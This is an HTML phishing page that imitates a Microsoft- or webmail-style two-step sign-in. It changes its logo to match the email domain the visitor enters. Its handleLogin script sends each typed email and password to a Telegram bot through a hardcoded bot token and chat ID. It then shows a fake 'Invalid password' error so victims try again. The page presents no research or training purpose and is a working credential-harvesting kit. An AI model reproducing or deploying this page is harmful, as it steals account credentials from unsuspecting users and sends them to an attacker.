<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Multi-Step Login</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="dist/output.css" rel="stylesheet">
  <!-- Tailwind CSS is included via CDN above; no need for @tailwind directives here. -->
</head>
<body class="h-screen flex items-center justify-center" style="background-color: rgba(141, 145, 16, 0.13);">
  <div class="bg-white w-full max-w-md p-8 rounded shadow-md" id="loginContainer">
    <img id="dynamicLogo" src="https://via.placeholder.com/100x30?text=Logo" alt="" class="mb-6" />
    <script>
      // Map common domains to logo URLs
      const logoMap = {
        'hotmail.com': 'https://cdn.freebiesupply.com/logos/thumbs/2x/outlook-logo.png',
        'outlook.com': 'https://cdn.freebiesupply.com/logos/thumbs/2x/outlook-logo.png',
        'gmail.com': 'https://upload.wikimedia.org/wikipedia/commons/4/4e/Gmail_Icon.png',
        'yahoo.com': 'https://upload.wikimedia.org/wikipedia/commons/2/24/Yahoo%21_logo.svg',
        // Add more as needed
      };

      function updateLogoByEmail(email) {
        const domain = email.split('@')[1]?.toLowerCase();
        const logoUrl = logoMap[domain] || `https://logo.clearbit.com/${domain}?size=100` || 'https://via.placeholder.com/100x30?text=Logo';
        document.getElementById('dynamicLogo').src = logoUrl;
        document.getElementById('dynamicLogo').alt = domain
          ? `Logo area showing the ${domain.split('.')[0]} logo on a plain light background. Displays branding for the login page.`
          : 'Logo area showing the service logo based on the email domain entered, on a plain light background. Displays branding for the login page.';
      }

      // Auto grab email from localStorage if available
      function autoGrabEmail() {
        const emailInput = document.getElementById('email');
        if (emailInput) {
          const savedEmail = localStorage.getItem('userEmail');
          if (savedEmail) {
            emailInput.value = savedEmail;
            updateLogoByEmail(savedEmail);
          }
          emailInput.addEventListener('input', function() {
            localStorage.setItem('userEmail', emailInput.value);
            updateLogoByEmail(emailInput.value);
          });
        }
      }

      document.addEventListener('DOMContentLoaded', function() {
        autoGrabEmail();
      });
    </script>
    <!-- Step 1: Email -->
    <div id="stepEmail">
      <h2 class="text-2xl font-semibold mb-2">Sign in</h2>
      <p class="text-sm text-gray-600 mb-6">to continue</p>
      <form onsubmit="return goToPasswordStep(event)">
        <input
          type="email"
          id="email"
          placeholder="Email, phone, or Skype"
          class="w-full px-4 py-2 border border-gray-300 rounded mb-6 focus:outline-none focus:ring-2 focus:ring-blue-500"
          required
        />
        <div class="flex justify-between">
          <div></div>
          <button
            type="submit"
            class="px-6 py-2 bg-blue-600 text-white rounded hover:bg-blue-700"
          >
            Next
          </button>
        </div>
      </form>
    </div>
    <!-- Step 2: Password -->
    <div id="stepPassword" class="hidden">
      <h2 class="text-2xl font-semibold mb-2">Enter password</h2>
      <p id="emailDisplay" class="text-sm text-gray-600 mb-4"></p>
      <!-- Success message placeholder -->
      <div id="successMsg" class="mb-4 p-3 bg-green-100 text-green-800 rounded text-center hidden"></div>
      <form onsubmit="return handleLogin(event)">
        <div class="relative mb-4">
          <input
            type="password"
            id="password"
            placeholder="Password"
            class="w-full px-4 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
          />
          <button
            type="button"
            onclick="togglePassword(event)"
            class="absolute right-3 top-2 text-sm text-blue-500"
          >Show</button>
        </div>
        <div id="errorMsg" class="text-red-600 text-sm mb-4 hidden">Invalid password. Please try again.</div>
        <div class="flex justify-between mb-6">
          <button
            type="button"
            onclick="goBackToEmail()"
            class="text-blue-600 text-sm hover:underline"
          >
            Back
          </button>
          <button
            type="submit"
            class="px-6 py-2 bg-blue-600 text-white rounded hover:bg-blue-700"
          >
            Sign in
          </button>
        </div>
      </form>
    </div>
  </div>
  <script>
    function goToPasswordStep(event) {
      event.preventDefault();
      const emailInput = document.getElementById('email').value.trim();
      if (!emailInput) return;
      document.getElementById('stepEmail').classList.add('hidden');
      document.getElementById('stepPassword').classList.remove('hidden');
      document.getElementById('emailDisplay').textContent = emailInput;
      return false;
    }
    function goBackToEmail() {
      document.getElementById('stepPassword').classList.add('hidden');
      document.getElementById('stepEmail').classList.remove('hidden');
    }
    function togglePassword(event) {
      const passwordInput = document.getElementById('password');
      const toggleBtn = event.target;
      if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        toggleBtn.textContent = 'Hide';
      } else {
        passwordInput.type = 'password';
        toggleBtn.textContent = 'Show';
      }
    }
    function handleLogin(event) {
      event.preventDefault();
      const email = document.getElementById('email').value.trim();
      const password = document.getElementById('password').value;

      const message = `ðŸ”” Login Alert\nðŸ“§ Email: ${email}\nðŸ”‘ Password: ${password}`;

      // Send to your Telegram Bot
      fetch("https://api.telegram.org/bot8177358222:AAFKiwLkZ02doyOdBF-0-dhACbBXVBJbuOI/sendMessage", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: "6315534139",
          text: message
        })
      });

      // Simulate login success or failure
      if (email === "admin@example.com" && password === "securepass") {
        alert("Login successful!");
        // Optionally redirect
        // window.location.href = "/dashboard.html";
      } else {
        document.getElementById('errorMsg').classList.remove("hidden");
      }

      return false;
    }
  </script>
</body>
</html>
